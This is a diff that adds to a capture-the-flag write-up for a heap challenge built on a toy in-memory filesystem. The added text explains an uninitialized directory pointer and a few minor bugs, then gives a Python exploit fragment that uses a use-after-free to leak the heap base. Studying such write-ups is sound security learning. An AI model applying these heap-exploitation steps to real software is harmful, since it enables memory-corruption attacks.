@@ -21,16 +21,56 @@ struct filesystem_object
     int type;                               // 1 = normal file, 2 = directory, 4 = symbolic link
     int unused;
     filesystem_object *parent_directory;    // Points to the parent directory
-    filesystem_object *childs;              // Head of a list of filesystem_object
+    filesystem_object *head;                // Head of a list of filesystem_object
     filesystem_object *next;                // Next filesystem_object in the current directory
     filesystem_object *file_name;           // Name of the file
     filesystem_object *file_content;        // Content of the file
 }
 ```
 
-As you can imagine, files don't have `childs` because they are not directory and obviously directories don't have `file_content` because they are not files. For instance a directory with 3 files will have the following structure.
+As you can imagine, files don't have `head` because they are not directory and obviously directories don't have `file_content` because they are not files. For instance a directory with 3 files will have the following structure.
 
 ![Filesystem](images/filesystem.png)
+
+The available commands are `ls`, `cat`, `cd`, `rm`, `mv`, `mkdir`, `mkfile`, `touch`, `pwd`, `ln` and `id`. They work pretty much like the UNIX commands except some limitations given by the context. Functions used for these command are almost clean: `mv` has a bug that allows to rename a file with a already existing file name in the current directory just prefixing the new name of the file with `/`(e.g. `mv name /new_name` will rename the file name to new_name in the current directory even if new_name already exists), and a 3 byte overflow in `mkfile` which i think is not usable in my opinion.
+Instead, the real vulnerabilities of this challenge is in the creation of a directory. Whenever a directory is created, the pointer to the `head` is not set to 0. This allows to create a new directory with a `head` pointer that could be controlled in some way.
+
+## Heap leak
+
+If a directory is freed, all of the files, directories, names and contents are freed even before the parent directory gets freed. If then a new directory is created it will contains the same `head` address of the previus and freed directory. Thus, my idea was exactly this one: free a directory with a file inside, reallocate it immediately and then list the files to leak an address of a freed chunk. Moreover, one file wasn't not enought cause one freed chunks just contains a null pointer to the next free chunk. Two file weren't not enought too, cause every argument of a command is allocated as a chunk(so just typing the command will consume chunks in the freed linked list).
+The part of the exploit that performs the leak is the following:
+
+```python
+makeDir     (conn, 'directory1')
+cdDir       (conn, 'directory1')
+createFile  (conn, 'file1', 'AAAA')
+createFile  (conn, 'file2', 'BBBB')
+createFile  (conn, 'file3', 'CCCC')
+cdDir       (conn, '..')
+rmFile      (conn, 'directory1')
+makeDir     (conn, 'directory1')
+leak = ls   (conn, 'directory1')
+leak = leak.split('\x1b\x5b\x30\x6d\x09')[2]
+leak = leak.ljust(8, '\x00')
+heap_base = u64(leak) - 0x12d20
+print 'Heap base: ' + hex(heap_base)
+cdDir       (conn, 'A' * 0x30)
+cdDir       (conn, 'A' * 0x30)
+cdDir       (conn, 'A' * 0x30)
+cdDir       (conn, 'AAAA')
+cdDir       (conn, 'AAAA')
+cdDir       (conn, 'AAAA')
+cdDir       (conn, 'AAAA')
+cdDir       (conn, '..')
+```
+
+commands after the `print` clear the workspace(i.e, fill some freed chunks) and then i preferred leave the directory for avoiding segfaults.
+
+
+
+
+
+
 
 
 
